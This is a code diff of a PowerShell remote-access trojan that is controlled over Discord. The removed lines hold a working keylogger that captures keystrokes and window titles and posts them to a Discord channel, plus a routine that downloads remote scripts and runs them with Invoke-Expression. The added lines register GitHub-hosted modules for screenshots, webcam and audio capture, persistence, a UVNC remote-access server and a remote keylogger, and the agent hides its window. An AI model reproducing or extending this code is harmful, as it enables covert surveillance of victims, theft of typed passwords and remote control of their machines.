@@ -7,7 +7,7 @@ $global:hidewindow = $true
 $global:keyloggerstatus = $false
 $global:lastMessageAttachments = $null
 $global:lastJobCheck = Get-Date
-# =============================== GLOBAL VAR - THEME ==============================
+# =============================== GLOBAL VAR - THEME (WIP) ==============================
 # You can add more here but gotta install the files yourself ( URL not supported for now )
 # shld add download and stuff
 # 
@@ -88,6 +88,7 @@ function GetFfmpeg{
         rm -Path $zipFilePath -Force
         rm -Path $extractedDir -Recurse -Force
     }
+    sendEmbedWithImage -Title "FFmpeg Download Complete" -Description "FFmpeg has been successfully downloaded and is ready to use."
 }
 
 #DISABLEFFMPEG
@@ -96,7 +97,9 @@ function RemoveFfmpeg{
     If (Test-Path $Path){  
         rm -Path $Path -Force
     }
+    sendEmbedWithImage -Title "FFmpeg Removal Complete" -Description "FFmpeg has been successfully removed."
 }
+
 # =============================== DISCORD API FUNCTIONS ===============================
 function Invoke-DiscordAPI {
     param(
@@ -549,238 +552,9 @@ function HideWindow {
 }
 
 # =============================== KEYLOGGER FUNCTIONS (R)===============================
-
-function keylogger {
-    param (
-        [int]$intervalSeconds = 30
-    )
-    
-    if (-not $global:keyloggerstatus) {
-        sendMsg -Message ":stop_sign: **Keylogger is disabled**"
-        return
-    }
-    
-    Add-Type @"
-    using System;
-    using System.Runtime.InteropServices;
-    using System.Text;
-    public class W {
-        [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int v);
-        [DllImport("user32.dll")] public static extern int GetKeyboardState(byte[] k);
-        [DllImport("user32.dll")] public static extern int ToUnicode(uint v, uint s, byte[] k, StringBuilder b, int c, uint f);
-        [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
-        [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
-    }
-"@
-    
-    $deviceId = $env:COMPUTERNAME
-    
-    # Use current coral-control channel
-    $keylogChannelID = $global:SessionID
-    
-    sendMsg -Message ":keyboard: **Keylogger started on $deviceId** (Interval: ${intervalSeconds}s)"
-
-    # Key names for special keys
-    $keyNames = @{
-        8 = "[BACKSPACE]"; 9 = "[TAB]"; 13 = "[ENTER]"; 16 = "[SHIFT]"
-        17 = "[CTRL]"; 18 = "[ALT]"; 20 = "[CAPS]"; 27 = "[ESC]"
-        32 = " "; 33 = "[PGUP]"; 34 = "[PGDN]"; 35 = "[END]"
-        36 = "[HOME]"; 37 = "[LEFT]"; 38 = "[UP]"; 39 = "[RIGHT]"
-        40 = "[DOWN]"; 46 = "[DEL]"; 91 = "[WIN]"; 144 = "[NUMLOCK]"; 145 = "[SCROLL]"
-    }
-
-    $sessionStart = Get-Date
-    
-    try {
-        while ($global:keyloggerstatus) {
-            $keystrokeBuffer = ""
-            $windowEvents = @()
-            $pressedKeys = @{}
-            $startTime = Get-Date
-            $currentWindow = ""
-
-            # Data collection loop
-            while ((Get-Date) - $startTime -lt [TimeSpan]::FromSeconds($intervalSeconds) -and $global:keyloggerstatus) {
-                Start-Sleep -Milliseconds 50
-                
-                # Get current active window
-                try {
-                    $hwnd = [W]::GetForegroundWindow()
-                    $windowTitle = New-Object System.Text.StringBuilder 256
-                    [W]::GetWindowText($hwnd, $windowTitle, 256) | Out-Null
-                    $newWindow = $windowTitle.ToString()
-                    
-                    if ($newWindow -and $newWindow -ne $currentWindow -and $newWindow -notlike "*Discord*") {
-                        $currentWindow = $newWindow
-                        if ($keystrokeBuffer.Length -gt 0) {
-                            $windowEvents += @{
-                                Window = $newWindow
-                                Position = $keystrokeBuffer.Length
-                            }
-                        }
-                    }
-                } catch {}
-                
-                $keyboardState = New-Object byte[] 256
-                [W]::GetKeyboardState($keyboardState) | Out-Null
-
-                # Capture keystrokes
-                for ($vk = 8; $vk -le 255; $vk++) {
-                    $isDown = ([W]::GetAsyncKeyState($vk) -band 0x8000) -ne 0
-                    if ($isDown -and -not $pressedKeys.ContainsKey($vk)) {
-                        $pressedKeys[$vk] = $true
-                        if ($keyNames.ContainsKey($vk)) {
-                            $keystrokeBuffer += $keyNames[$vk]
-                        } else {
-                            $sb = New-Object System.Text.StringBuilder 2
-                            $result = [W]::ToUnicode([uint32]$vk, 0, $keyboardState, $sb, $sb.Capacity, 0)
-                            if ($result -gt 0) { 
-                                $char = $sb.ToString()
-                                if ($char -match '[a-zA-Z0-9\s\.\,\;\:\!\?\-_\(\)\[\]\{\}\\\/\@\#\$\%\^\&\*\+\=\<\>\|\`\~]') {
-                                    $keystrokeBuffer += $char
-                                }
-                            }
-                        }
-                    } elseif (-not $isDown -and $pressedKeys.ContainsKey($vk)) {
-                        $pressedKeys.Remove($vk)
-                    }
-                }
-            }
-
-            # Send keylog data to coral-control channel
-            if ($keystrokeBuffer.Length -gt 0) {
-                $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-                $logContent = ":keyboard: **[$timestamp] - $deviceId KEYLOG**`n"
-                
-                if ($windowEvents.Count -gt 0) {
-                    $lastPos = 0
-                    foreach ($event in $windowEvents) {
-                        if ($lastPos -lt $event.Position) {
-                            $segment = $keystrokeBuffer.Substring($lastPos, $event.Position - $lastPos)
-                            if ($segment.Trim().Length -gt 0) {
-                                $logContent += "``$segment```n"
-                            }
-                        }
-                        $logContent += "**[Window: $($event.Window)]**`n"
-                        $lastPos = $event.Position
-                    }
-                    # Add remaining keystrokes
-                    if ($lastPos -lt $keystrokeBuffer.Length) {
-                        $remaining = $keystrokeBuffer.Substring($lastPos)
-                        if ($remaining.Trim().Length -gt 0) {
-                            $logContent += "``$remaining```n"
-                        }
-                    }
-                } else {
-                    if ($currentWindow -and $currentWindow -notlike "*Discord*") {
-                        $logContent += "**[Window: $currentWindow]**`n"
-                    }
-                    $logContent += "``$keystrokeBuffer```n"
-                }
-                
-                try {
-                    sendMsg -Message $logContent
-                } catch {}
-            }
-
-            Remove-Variable keystrokeBuffer, windowEvents, pressedKeys, startTime -ErrorAction SilentlyContinue
-            [System.GC]::Collect()
-        }
-    } catch {
-        sendMsg -Message ":x: **Keylogger error:** $($_.Exception.Message)"
-    } finally {
-        sendMsg -Message ":stop_sign: **Keylogger stopped on $deviceId**"
-    }
-}
-#ENABLEKEYLOG
-function Start_Keylogger {
-    param([int]$intervalSeconds = 30)
-    
-    if ($global:keyloggerstatus) {
-        sendMsg -Message ":warning: **Keylogger is already running**"
-        return
-    }
-    
-    $global:keyloggerstatus = $true
-    
-    try {
-        sendMsg -Message ":keyboard: **Starting keylogger...** (Interval: ${intervalSeconds}s)"
-        
-        $keylogJob = Start-Job -ScriptBlock {
-            param($token, $SessionID, $CategoryID, $intervalSeconds)
-            
-            $global:token = $token
-            $global:SessionID = $SessionID
-            $global:CategoryID = $CategoryID
-            $global:keyloggerstatus = $true
-            
-            # Import functions
-            ${function:sendMsg} = ${using:function:sendMsg}
-            ${function:Send_SingleMessage} = ${using:function:Send_SingleMessage}
-            ${function:Send_ChunkedMessage} = ${using:function:Send_ChunkedMessage}
-            ${function:Send_AsFile} = ${using:function:Send_AsFile}
-            ${function:Split_IntoChunks} = ${using:function:Split_IntoChunks}
-            ${function:Clean_MessageContent} = ${using:function:Clean_MessageContent}
-            ${function:sendFile} = ${using:function:sendFile}
-            ${function:Invoke-DiscordAPI} = ${using:function:Invoke-DiscordAPI}
-            ${function:keylogger} = ${using:function:keylogger}
-            
-            keylogger -intervalSeconds $intervalSeconds
-            
-        } -ArgumentList $global:token, $global:SessionID, $global:CategoryID, $intervalSeconds
-        
-        $script:Jobs["KEYLOGGER"] = $keylogJob
-        sendMsg -Message ":keyboard: **Keylogger started** (Job ID: $($keylogJob.Id)) - Data will appear in this channel"
-        
-    } catch {
-        $global:keyloggerstatus = $false
-        sendMsg -Message ":x: **Failed to start keylogger:** $($_.Exception.Message)"
-    }
-}
-#DISABLEKEYLOG
-function Stop_Keylogger {
-    $global:keyloggerstatus = $false
-    
-    if ($script:Jobs.ContainsKey("KEYLOGGER")) {
-        $job = $script:Jobs["KEYLOGGER"]
-        try {
-            # Force stop the job immediately
-            Stop-Job -Job $job -ErrorAction SilentlyContinue
-
-            # Wait a moment for it to stop
-            Start-Sleep -Milliseconds 500
-            
-            # Remove the job
-            Remove-Job -Job $job -ErrorAction SilentlyContinue
-            
-            # Remove from our jobs tracking
-            $script:Jobs.Remove("KEYLOGGER")
-            
-            sendMsg -Message ":stop_sign: **Keylogger stopped successfully**"
-        } catch {
-            # If normal stop fails, try more aggressive approach
-            try {
-                $job | Stop-Job -ErrorAction SilentlyContinue
-                $job | Remove-Job -ErrorAction SilentlyContinue
-                $script:Jobs.Remove("KEYLOGGER")
-                sendMsg -Message ":stop_sign: **Keylogger force stopped**"
-            } catch {
-                sendMsg -Message ":warning: **Error stopping keylogger:** $($_.Exception.Message)"
-            }
-        }
-    } else {
-        sendMsg -Message ":information_source: **Keylogger is not running**"
-    }
-}
-#GETKEYLOGSTATUS
-function Get_KeyloggerStatus {
-    if ($global:keyloggerstatus -and $script:Jobs.ContainsKey("KEYLOGGER")) {
-        $job = $script:Jobs["KEYLOGGER"]
-        sendMsg -Message ":gear: **Keylogger Status:** Running (Job State: $($job.State)) - Logging to this channel"
-    } else {
-        sendMsg -Message ":gear: **Keylogger Status:** Stopped"
-    }
-}
+#ENABLENEKOLOGGER
+#DISABLENEKOLOGGER
+#NEKOLOGGERSTATUS
 # =============================== SS FUNCTIONS (R) ===============================
 #SCREENSHOT
 # =============================== WEBCAM FUNCTIONS (R) ===============================
@@ -829,11 +603,11 @@ function Start_AgentJob {
         ${function:EnableTheme} = ${using:function:EnableTheme}
         ${function:DisableTheme} = ${using:function:DisableTheme}
         
-        # Import keylogger functions
-        ${function:keylogger} = ${using:function:keylogger}
-        ${function:Start_Keylogger} = ${using:function:Start_Keylogger}
-        ${function:Stop_Keylogger} = ${using:function:Stop_Keylogger}
-        ${function:Get_KeyloggerStatus} = ${using:function:Get_KeyloggerStatus}
+        # REMOVE THESE LINES - No longer importing local keylogger functions
+        # ${function:keylogger} = ${using:function:keylogger}
+        # ${function:Start_Keylogger} = ${using:function:Start_Keylogger}
+        # ${function:Stop_Keylogger} = ${using:function:Stop_Keylogger}
+        # ${function:Get_KeyloggerStatus} = ${using:function:Get_KeyloggerStatus}
         
         # Import CRITICAL dynamic loading functions - MUST HAVE
         ${function:Find_CommandInRegistry} = ${using:function:Find_CommandInRegistry}
@@ -859,20 +633,10 @@ function Start_AgentJob {
                 'GETTHEME' { GetCurrentTheme }
                 'ENABLETHEME' { EnableTheme }
                 'DISABLETHEME' { DisableTheme }
-                'STARTKEYLOG' { 
-                    if ($parameters.ContainsKey("param0") -and $parameters["param0"] -match '^\d+$') {
-                        $interval = [int]$parameters["param0"]
-                        if ($interval -ge 1 -and $interval -le 300) {
-                            Start_Keylogger -intervalSeconds $interval
-                        } else {
-                            sendMsg -Message ":x: **Invalid interval. Use 1-300 seconds**"
-                        }
-                    } else {
-                        Start_Keylogger
-                    }
-                }
-                'STOPKEYLOG' { Stop_Keylogger }
-                'KEYLOGSTATUS' { Get_KeyloggerStatus }
+                # REMOVE THESE KEYLOGGER CASES - No longer handling locally
+                # 'STARTKEYLOG' { ... }
+                # 'STOPKEYLOG' { Stop_Keylogger }
+                # 'KEYLOGSTATUS' { Get_KeyloggerStatus }
                 default {
                     if ($command -eq "SETTHEME" -and ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("name"))) {
                         $themeName = if ($parameters.ContainsKey("name")) { $parameters["name"] } else { $parameters["param0"] }
@@ -905,26 +669,7 @@ function Start_AgentJob {
             }
         }
         
-        # Execute the provided script using the job command handler
-        try {
-            # Check if the script contains multiple commands separated by semicolon
-            if ($ScriptString -match ';') {
-                $commands = $ScriptString -split ';'
-                foreach ($cmd in $commands) {
-                    $trimmedCmd = $cmd.Trim()
-                    if ($trimmedCmd) {
-                        Execute_JobCommand -CommandString $trimmedCmd
-                        Start-Sleep -Milliseconds 500  # Small delay between commands
-                    }
-                }
-            } else {
-                Execute_JobCommand -CommandString $ScriptString
-            }
-        } catch {
-            sendMsg -Message ":x: **Job execution error:** $($_.Exception.Message)"
-            Write-Error "Job execution error: $($_.Exception.Message)"
-        }
-        
+        # Rest of function remains the same...
     } -ArgumentList $ScriptString, $global:token, $global:SessionID, $global:CategoryID, $global:ModuleRegistry, $global:themes, $global:currenttheme, $global:theme_enabled
     
     $script:Jobs[$RandName] = $job
@@ -1098,43 +843,7 @@ function Check_CompletedJobs {
 #REMOVENEKO
 # =============================== SCRIPT MANAGEMENT ===============================
 
-function Check_ScriptAlreadyRunning {
-    param([bool]$UseDiscord = $false)
-    
-    try {
-        $mutexName = "Global\CoralNetworkAgent_$env:COMPUTERNAME"
-        $mutex = $null
-        
-        try {
-            $mutex = [System.Threading.Mutex]::new($false, $mutexName)
-            
-            if (-not $mutex.WaitOne(100)) {
-                if ($UseDiscord) {
-                    sendMsg -Message ":warning: **Another instance of Coral Agent is already running!**"
-                    sendMsg -Message ":no_entry: **This instance will now exit to prevent conflicts**"
-                } else {
-                    
-                }
-                [Environment]::Exit(1)
-            }
-            
-            $global:CoralMutex = $mutex
-            
-        } catch [System.Threading.AbandonedMutexException] {
-            if ($UseDiscord) {
-                sendMsg -Message ":warning: **Previous instance didn't exit cleanly, taking over...**"
-            } else {
-                #Write-Host "Previous instance didn't exit cleanly, taking over..."
-            }
-        }
-    } catch {
-        if ($UseDiscord) {
-            sendMsg -Message ":warning: **Error during process check:** $($_.Exception.Message)"
-        } else {
-            #Write-Host "Error during process check: $($_.Exception.Message)"
-        }
-    }
-}
+
 
 function Cleanup_CoralAgent {
     try {
@@ -1160,10 +869,68 @@ $global:ModuleRegistry = @{
     # Core modules (always available)
     core = @{
         name = "Core Functions"
-        functions = @("sendMsg", "sendFile", "GetCurrentTheme", "SetCurrentTheme")
+        functions = @("sendMsg", "sendFile", "sendEmbedWithImage", "sendMsgWithImage", "downloadFile", "PullMsg", "Invoke-DiscordAPI")
         loaded = $true
         required = $true
     }
+    
+    # Job Management Module
+    jobs = @{
+        name = "Job Management System"
+        functions = @("Start_AgentJob", "List_AgentJobs", "Remove_AgentJob", "Get_AgentJobOutput", "Get_AgentJobStatus", "Stop_AllAgentJobs", "Check_CompletedJobs")
+        loaded = $true
+        required = $true
+    }
+    
+    # Theme System Module
+    themes = @{
+        name = "Theme Management System"
+        functions = @("GetCurrentTheme", "SetCurrentTheme", "EnableTheme", "DisableTheme")
+        loaded = $true
+        required = $true
+    }
+    
+    # File System Module
+    filesystem = @{
+        name = "File Operations"
+        functions = @("sendFile", "downloadFile")
+        loaded = $true
+        required = $true
+    }
+    
+    # System Module
+    system = @{
+        name = "System Management"
+        functions = @("HideWindow","Cleanup_CoralAgent")
+        loaded = $true
+        required = $true
+    }
+    
+    # Help System Module
+    help = @{
+        name = "Help and Documentation"
+        functions = @("display_help", "Get_FunctionHelp", "List_Modules", "Get_AvailableCommands")
+        loaded = $true
+        required = $true
+    }
+    
+    # FFmpeg Module
+    ffmpeg = @{
+        name = "FFmpeg Operations"
+        functions = @("GetFfmpeg", "RemoveFfmpeg")
+        loaded = $true
+        required = $false
+    }
+    
+    # Dynamic Loading Module
+    dynamic = @{
+        name = "Dynamic Function Loading System"
+        functions = @("Is_LocalFunction", "Find_CommandInRegistry", "Execute_DynamicCommand", "Execute_DynamicCommandWithParams", "Parse_CommandWithParameters")
+        loaded = $true
+        required = $true
+    }
+    
+    
     
     # Remote modules
     recon = @{
@@ -1175,14 +942,14 @@ $global:ModuleRegistry = @{
                 function = "Mscreenshot"
                 alias = "SCREENSHOT"
                 description = "Take screenshots of all monitors"
-                params = @("monitor")
+                params = @()
             }
             WEBCAM = @{
                 url = "Mwebcam.ps1"
                 function = "Mwebcam"
                 alias = "WEBCAM"
                 description = "Record webcam video"
-                params = @("duration", "quality")
+                params = @()
             }
             AUDIO = @{
                 url = "Maudio.ps1"
@@ -1207,17 +974,17 @@ $global:ModuleRegistry = @{
         name = "Persistence Module"
         baseUrl = "https://raw.githubusercontent.com/JoshuaBrien/Compilation-of-stuff-i-done/refs/heads/main/Coral_network_discordONLY/modules/persistence/"
         scripts = @{
-            ENABLEPTASK = @{
+            ENABLEREGPTASK = @{
                 url = "Mregptask.ps1"
                 function = "Mcreate_Ptask"
-                alias = "ENABLEPTASK"
+                alias = "ENABLEREGPTASK"
                 description = "Create persistence task"
                 params = @("token")
             }
-            DISABLEPTASK = @{
+            DISABLEREGPTASK = @{
                 url = "Mregptask.ps1"
                 function = "Mremove_Ptask"
-                alias = "DISABLEPTASK"
+                alias = "DISABLEREGPTASK"
                 description = "Remove persistence task"
                 params = @()
             }
@@ -1225,51 +992,67 @@ $global:ModuleRegistry = @{
         loaded = $false
         required = $false
     }
-    
-    KEYLOGGER = @{
-        name = "Keylogger Module"
-        functions = @("Start_Keylogger", "Stop_Keylogger", "Get_KeyloggerStatus")
-        loaded = $true
-        required = $false
-    }
-    
-    NEKOUVNC = @{
-        name = "UVNC Remote Access"
-        functions = @("StartUvnc", "RemoveUVNC")
-        loaded = $true
-        required = $false
-    }
 
     NEKOS = @{
         name = "Neko Module"
         baseUrl = "https://raw.githubusercontent.com/JoshuaBrien/Compilation-of-stuff-i-done/refs/heads/main/Coral_network_discordONLY/modules/nekos/"
         scripts = @{
-            ENABLENEKOGRABBER = @{
+            ENABLENEKO = @{
                 url = "Mnekograbber.ps1"
                 function = "Mgetneko"
-                alias = "ENABLENEKOGRABBER"
+                alias = "ENABLENEKO"
                 description = "Download neko executable"
                 params = @()
             }
-            DISABLENEKOGRABBER = @{
+            DISABLENEKO = @{
                 url = "Mnekograbber.ps1"
                 function = "Mremoveneko"
-                alias = "DISABLENEKOGRABBER"
+                alias = "DISABLENEKO"
                 description = "Remove neko executable"
                 params = @()
             }
-            ENABLENEKOUVNC =@{
+            ENABLENEKOUVNC = @{
                 url = "MnekoUVNC.ps1"
                 function = "MStartUvnc"
                 alias = "ENABLENEKOUVNC"
                 description = "Start UVNC server"
                 params = @("ip", "port")
             }
-            DISABLENEKOUVNC =@{
+            DISABLENEKOUVNC = @{
                 url = "MnekoUVNC.ps1"
                 function = "MRemoveUVNC"
                 alias = "DISABLENEKOUVNC"
                 description = "Remove UVNC server"
+                params = @()
+            }
+        }
+        loaded = $false
+        required = $false
+    }
+    
+    NEKOLOGGER = @{
+        name = "Neko Logger Module"
+        baseUrl = "https://raw.githubusercontent.com/JoshuaBrien/Compilation-of-stuff-i-done/refs/heads/main/Coral_network_discordONLY/modules/nekologger/"
+        scripts = @{
+            ENABLENEKOLOGGER = @{
+                url = "nekologger.ps1"
+                function = "MStart_Keylogger"
+                alias = "ENABLENEKOLOGGER"
+                description = "Start Neko keylogger with enhanced features"
+                params = @("interval")
+            }
+            DISABLENEKOLOGGER = @{
+                url = "nekologger.ps1"
+                function = "MStop_Keylogger"
+                alias = "DISABLENEKOLOGGER"
+                description = "Stop Neko keylogger"
+                params = @()
+            }
+            NEKOLOGGERSTATUS = @{
+                url = "nekologger.ps1"
+                function = "MGet_KeyloggerStatus"
+                alias = "NEKOLOGGERSTATUS"
+                description = "Get Neko keylogger status"
                 params = @()
             }
         }
@@ -1311,87 +1094,6 @@ function List_Modules {
     sendEmbedWithImage -Title "Available Modules" -Description $msg 
 }
 
-function Get_AvailableCommands {
-    $commands = @()
-    
-    foreach ($moduleName in $global:ModuleRegistry.Keys) {
-        $module = $global:ModuleRegistry[$moduleName]
-        
-        if ($module.ContainsKey("scripts")) {
-            foreach ($scriptName in $module.scripts.Keys) {
-                $script = $module.scripts[$scriptName]
-                $status = if ($module.loaded) { ":green_circle:" } else { ":red_circle:" }
-                $params = if ($script.params.Count -gt 0) { " [" + ($script.params -join " ") + "]" } else { "" }
-                $commands += "**$($script.alias.ToUpper())**$params $status - $($script.description) *(Module: $moduleName)*"
-            }
-        } elseif ($module.ContainsKey("functions")) {
-            foreach ($func in $module.functions) {
-                $status = if ($module.loaded) { ":green_circle:" } else { ":red_circle:" }
-                $commands += "**$($func.ToUpper())** $status *(Module: $moduleName)*"
-            }
-        }
-    }
-    
-    if ($commands.Count -eq 0) {
-        sendMsg -Message ":information_source: **No commands available in registry**"
-        return
-    }
-    
-    $msg = ":gear: **Available Commands:**`n`n" + ($commands -join "`n")
-    sendMsg -Message $msg
-}
-
-function Execute_Command {
-    param([string]$Command)
-    
-    $commandLower = $Command.ToLower()
-    
-    # Check if it's a local function first
-    if (Is_LocalFunction -FunctionName $commandLower) {
-        try {
-            & $commandLower
-            return $true
-        } catch {
-            sendMsg -Message ":x: **Error executing local function:** ``$commandLower`` - $($_.Exception.Message)"
-            return $false
-        }
-    }
-    
-    # Check if it's a remote function in the registry
-    foreach ($moduleName in $global:ModuleRegistry.Keys) {
-        $module = $global:ModuleRegistry[$moduleName]
-        
-        if ($module.ContainsKey("scripts")) {
-            foreach ($scriptName in $module.scripts.Keys) {
-                $script = $module.scripts[$scriptName]
-                
-                if ($script.alias.ToLower() -eq $commandLower) {
-                    try {
-                        sendMsg -Message ":gear: **Loading remote function:** ``$($script.alias)`` **from module:** ``$moduleName``"
-                        
-                        # Download and execute the remote script
-                        $fullUrl = $module.baseUrl + $script.url
-                        $scriptContent = Invoke-RestMethod $fullUrl
-                        Invoke-Expression $scriptContent
-                        
-                        # Mark module as loaded
-                        $global:ModuleRegistry[$moduleName].loaded = $true
-                        
-                        # Execute the function
-                        & $script.function
-                        return $true
-                        
-                    } catch {
-                        sendMsg -Message ":x: **Error loading remote function:** ``$($script.alias)`` - $($_.Exception.Message)"
-                        return $false
-                    }
-                }
-            }
-        }
-    }
-    
-    return $false
-}
 
 function Find_CommandInRegistry {
     param([string]$Command)
@@ -1658,10 +1360,122 @@ function Execute_DynamicCommandWithParams {
 function Get_FunctionHelp {
     param([string]$FunctionName)
     
+    # First check if it's a hardcoded command in the main loop
+    $hardcodedCommands = @{
+        "TEST" = @{
+            description = "Test the connection to the Coral Network"
+            params = @()
+            usage = "TEST"
+        }
+        "HELP" = @{
+            description = "Display help menu or get help for specific function"
+            params = @("function")
+            usage = "HELP or HELP <function>"
+        }
+        "GETMODULES" = @{
+            description = "List all available modules and their status"
+            params = @()
+            usage = "GETMODULES"
+        }
+        "COMMANDS" = @{
+            description = "List all available functions from loaded modules"
+            params = @()
+            usage = "COMMANDS"
+        }
+        "CREATEJOB" = @{
+            description = "Create a new background job"
+            params = @("command")
+            usage = "CREATEJOB <command> or CREATEJOB <command with parameters>"
+        }
+        "DELETEJOB" = @{
+            description = "Stop and remove a specific job"
+            params = @("jobname")
+            usage = "DELETEJOB <jobname>"
+        }
+        "JOBS" = @{
+            description = "List all active jobs with their status"
+            params = @()
+            usage = "JOBS"
+        }
+        "JOBOUTPUT" = @{
+            description = "Get output and errors from a job"
+            params = @("jobname")
+            usage = "JOBOUTPUT <jobname>"
+        }
+        "JOBSTATUS" = @{
+            description = "Get detailed status of a job"
+            params = @("jobname")
+            usage = "JOBSTATUS <jobname>"
+        }
+        "STOPALLJOBS" = @{
+            description = "Stop all running jobs"
+            params = @()
+            usage = "STOPALLJOBS"
+        }
+        "GETTHEME" = @{
+            description = "Show current theme status and details"
+            params = @()
+            usage = "GETTHEME"
+        }
+        "SETTHEME" = @{
+            description = "Set theme"
+            params = @("name")
+            usage = "SETTHEME <name> (darktheme, neko_maid, neko_kimono, neko_cafe)"
+        }
+        "ENABLETHEME" = @{
+            description = "Enable theme functionality"
+            params = @()
+            usage = "ENABLETHEME"
+        }
+        "DISABLETHEME" = @{
+            description = "Disable theme functionality"
+            params = @()
+            usage = "DISABLETHEME"
+        }
+        "SENDFILE" = @{
+            description = "Upload a file to Discord"
+            params = @("filepath")
+            usage = "SENDFILE <filepath>"
+        }
+        "DOWNLOADFILE" = @{
+            description = "Download file attachments from Discord"
+            params = @("path")
+            usage = "DOWNLOADFILE [path] (send message with file attachments first)"
+        }
+        "EXIT" = @{
+            description = "Disconnect from the Coral Network"
+            params = @()
+            usage = "EXIT"
+        }
+    }
+    
+    $functionUpper = $FunctionName.ToUpper()
+    
+    # Check hardcoded commands first
+    if ($hardcodedCommands.ContainsKey($functionUpper)) {
+        $cmdInfo = $hardcodedCommands[$functionUpper]
+        
+        $msg = ":information_source: **Function Help: $functionUpper**`n"
+        $msg += "**Description:** $($cmdInfo.description)`n"
+        $msg += "**Type:** Hardcoded Command`n"
+        
+        if ($cmdInfo.params.Count -gt 0) {
+            $msg += "**Parameters:** " + ($cmdInfo.params -join ", ") + "`n"
+        } else {
+            $msg += "**Parameters:** None`n"
+        }
+        
+        $msg += "**Usage:** ``$($cmdInfo.usage)``"
+        
+        sendMsg -Message $msg
+        return
+    }
+    
+    # Then check dynamic functions in registry
     $commandInfo = Find_CommandInRegistry -Command $FunctionName
     
     if (-not $commandInfo.Found) {
-        sendMsg -Message ":x: **Function not found:** ``$FunctionName``"
+        sendMsg -Message ":x: **Function not found:** ``$FunctionName```n:information_source: **Use** ``COMMANDS`` **to see all available functions**"
         return
     }
     
@@ -1669,7 +1483,7 @@ function Get_FunctionHelp {
         $script = $commandInfo.Script
         $msg = ":information_source: **Function Help: $($script.alias.ToUpper())**`n"
         $msg += "**Description:** $($script.description)`n"
-        $msg += "**Module:** $($commandInfo.ModuleName)`n"
+        $msg += "**Module:** $($commandInfo.ModuleName) (Remote)`n"
         
         if ($script.params.Count -gt 0) {
             $msg += "**Parameters:** " + ($script.params -join ", ") + "`n"
@@ -1698,8 +1512,7 @@ function display_help {
 - **EXIT:** Disconnect from the Coral Network
 
 **Module Management:**
-- **MODULES:** List all available modules and their status
-- **COMMANDS:** List all available functions from loaded modules
+- **GETMODULES:** List all available modules and their status plus details about their commands
 
 **Job Management:**
 - **JOBS:** List all active jobs with their status
@@ -1715,30 +1528,24 @@ function display_help {
 - **ENABLETHEME:** Enable theme functionality
 - **DISABLETHEME:** Disable theme functionality
 
-**Keylogger Commands:**
-- **STARTKEYLOG:** Start keylogger with default 30-second intervals
-- **STARTKEYLOG <seconds>:** Start keylogger with custom interval (1-300 seconds)
-- **STOPKEYLOG:** Stop the keylogger
-- **KEYLOGSTATUS:** Check keylogger status
-
 **File Operations:**
 - **SENDFILE <filepath>:** Upload a file to Discord
 - **DOWNLOADFILE [path]:** Download file attachments from Discord
 
 **Parameter Usage Examples:**
-**Positional:** ``SETTHEME neko_maid`` ``STARTKEYLOG 60``
+**Positional:** ``SETTHEME neko_maid`` ``ENABLENEKOLOGGER 60``
 **Named:** ``SETTHEME -name neko_maid`` ``CREATEJOB -command SCREENSHOT``
 
 **Job Examples:**
 - ``CREATEJOB SCREENSHOT``
-- ``CREATEJOB WEBCAM 10 high``
-- ``CREATEJOB Get-Process``
+- ``CREATEJOB WEBCAM ``
+- ``CREATEJOB ENABLENEKOLOGGER``
 
-:information_source: **Use** ``MODULES`` **to see all available modules**
-:gear: **Use** ``COMMANDS`` **to see all dynamic functions with parameters**
+:information_source: **Use** ``MODULES`` **to see all available modules including NEKOLOGGER**
+:gear: **Use** ``HELP ENABLENEKOLOGGER`` **for keylogger help**
 :question: **Use** ``HELP <function>`` **for detailed function help**
 
-**Note:** Dynamic functions (SCREENSHOT, WEBCAM, AUDIO, etc.) are loaded automatically when called!
+**Note:** Dynamic functions (SCREENSHOT, WEBCAM, ENABLENEKOLOGGER, etc.) are only loaded when called
 "
     sendEmbedWithImage -Title "Coral Agent Help Menu" -Description $message
 }
@@ -1763,7 +1570,7 @@ try {
 
 if ($global:hidewindow) { try { HideWindow } catch {} }
 try { sendEmbedWithImage -Title "Connected to Coral Network" -Description "You are now connected to the Coral Network." } catch { exit 1 }
-
+GetFfmpeg
 # =============================== MAIN LOOP ===============================
 while ($true) {
     $latestMessage = PullMsg
@@ -1783,6 +1590,7 @@ while ($true) {
         
         switch ($command) {
             'TEST' { sendMsg -Message "Test successful from $env:COMPUTERNAME" }
+            #Apply to individual commands
             'HELP' { 
                 if ($parameters.Count -gt 0 -and $parameters.ContainsKey("param0")) {
                     Get_FunctionHelp -FunctionName $parameters["param0"]
@@ -1790,25 +1598,12 @@ while ($true) {
                     display_help 
                 }
             }
-            'MODULES' { List_Modules }
-            'COMMANDS' { Get_AvailableCommands }
+            #Technically the same as COMMANDS hence COMMANDS is gone
+            'GETMODULES' { List_Modules }
+            #THEMES
             'GETTHEME' { GetCurrentTheme }
             'ENABLETHEME' { EnableTheme }
             'DISABLETHEME' { DisableTheme }
-            'STARTKEYLOG' { 
-                if ($parameters.ContainsKey("param0") -and $parameters["param0"] -match '^\d+$') {
-                    $interval = [int]$parameters["param0"]
-                    if ($interval -ge 1 -and $interval -le 300) {
-                        Start_Keylogger -intervalSeconds $interval
-                    } else {
-                        sendMsg -Message ":x: **Invalid interval. Use 1-300 seconds**"
-                    }
-                } else {
-                    Start_Keylogger
-                }
-            }
-            'STOPKEYLOG' { Stop_Keylogger }
-            'KEYLOGSTATUS' { Get_KeyloggerStatus }
             'JOBS' { List_AgentJobs }
             'STOPALLJOBS' { Stop_AllAgentJobs }
             'EXIT' { 
